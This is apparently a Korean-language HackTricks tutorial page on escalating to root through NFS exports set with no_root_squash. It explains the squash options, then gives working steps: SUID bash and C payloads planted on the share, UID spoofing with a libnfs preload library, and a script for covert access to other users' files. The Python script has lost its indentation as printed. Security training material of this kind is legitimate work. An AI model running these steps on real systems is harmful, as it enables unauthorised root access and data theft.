# NFS No Root Squash Misconfiguration 권한 상승

{{#include ../../banners/hacktricks-training.md}}

## Squashing 기본 정보

NFS AUTH_SYS/AUTH_UNIX를 사용하는 경우, 서버는 각 RPC 요청에 제공된 `uid` 및 `gid`를 기반으로 파일 권한을 확인합니다. Kerberos와 같은 다른 보안 flavor는 서로 다른 credential을 사용하며, 서버는 권한을 확인하기 전에 숫자 credential을 매핑할 수 있습니다.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: 모든 UID와 GID를 anonymous account로 매핑하며, Linux에서는 기본값이 `nobody` (65534)입니다. `no_all_squash`는 root가 아닌 요청에 대한 기본값입니다.<sup>[[4]](#references)</sup>
- **`root_squash`**: Linux에서 기본값이며, UID/GID 0 (root)을 사용하는 요청을 anonymous account로 매핑합니다. 다른 UID와 GID는 squash되지 않습니다.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: root squashing을 비활성화하므로 UID/GID 0을 사용하는 요청이 서버에서 root로 평가될 수 있습니다.<sup>[[4]](#references)</sup>

허용된 client가 **`no_root_squash`**로 구성된 writable export를 **`/etc/exports`**에서 mount할 수 있다면, 해당 client의 UID/GID 0 요청은 서버의 root user로서 해당 위치에 write할 수 있습니다.<sup>[[4]](#references)</sup>

**NFS**에 대한 자세한 정보는 다음을 확인하세요.

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## 권한 상승

### Remote Exploit

bash를 사용하는 Option 1:
- 허용된 client에서 writable export를 root로 mount하고, **`/bin/bash`**를 해당 위치에 복사한 다음 **SUID** bit를 설정하고, `nosuid`를 사용하지 않는 victim mount에서 실행합니다.<sup>[[2]](#references)[[4]](#references)</sup>
- 업로드된 file이 root 소유로 유지되려면 서버에서 **`no_root_squash`**를 사용해야 합니다. root가 squash되는 경우, client가 해당 account의 numeric UID/GID로 합법적으로 생성하거나 소유할 수 있을 때만 다른 account를 위한 SUID binary를 만들 수 있습니다.<sup>[[4]](#references)</sup>
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
컴파일된 C code를 사용하는 Option 2:
- 허용된 client에서 directory를 mount하고, SUID 권한을 악용하는 컴파일된 payload를 복사한 뒤 **SUID** bit를 설정하고 victim에서 실행합니다([C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c) 참조).
- 이전과 동일한 제한 사항
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Local Exploit

> [!TIP]
> **victim machine**으로 향하는 **tunnel**을 생성할 수 있다면, 필요한 포트를 **tunnelling**하여 이 **privilege escalation**을 악용하는 **Remote version**을 여전히 사용할 수 있습니다.\
> `/etc/exports`가 export를 victim의 IP로 제한하는 경우 다음 trick이 유용합니다. remote client는 이를 mount할 수 없지만, local technique은 허용된 host에 이미 mount된 share를 통해 동작할 수 있습니다.<sup>[[2]](#references)</sup>\
> 이 unprivileged libnfs method를 사용하려면 **`/etc/exports`**의 export에서 프로세스가 non-reserved source port를 사용할 수 있도록 `insecure` flag를 사용해야 합니다. 기본값은 `secure`이지만, reserved port에 bind할 수 있는 프로세스에는 이 옵션이 필요하지 않습니다.<sup>[[1]](#references)[[4]](#references)</sup>

### Basic Information

NFSv3 AUTH_UNIX client는 각 call에 effective UID, GID 및 groups를 포함하며, server는 이를 permission checks에 사용합니다. 이 local technique은 [libnfs](https://github.com/sahlberg/libnfs)를 통해 RPC credentials를 위조하여 해당 모델을 악용합니다. libnfs의 preload module은 NFS context에서 UID/GID를 override할 수 있습니다.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Compiling the Library

libnfs example은 target kernel에 맞게 조정해야 할 수 있습니다. 여기서 사용한 walkthrough에서는 preload module을 compiling하기 전에 fallocate syscalls를 comment out해야 한다고 구체적으로 설명합니다.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Exploit 수행

이 예제에서는 shell을 실행하는 작은 C helper를 생성한 다음, 이를 share에 배치하고 NFS context에서 UID 0으로 `ld_nfs.so`를 사용해 SUID-root로 만듭니다.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Exploit code 컴파일:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **exploit을 share에 배치하고 UID를 위조하여 권한을 수정합니다**.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **exploit을 실행하여 root privileges를 획득합니다**.<sup>[[2]](#references)</sup>
```bash
/mnt/share/a.out
#root
```
### Bonus: 은밀한 파일 접근을 위한 NFShell

root access를 획득하면 이 `nfsh.py` 패턴은 command를 실행하기 전에 effective UID를 대상 파일의 UID로 설정하므로, 소유권을 재귀적으로 변경하지 않고도 접근할 수 있습니다.<sup>[[2]](#references)</sup>
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
다음과 같이 실행:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [잘 알려지지 않은 NFS privesc 이야기](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: NFS 버전 3 프로토콜 사양](https://datatracker.ietf.org/doc/html/rfc1813)
{{#include ../../banners/hacktricks-training.md}}
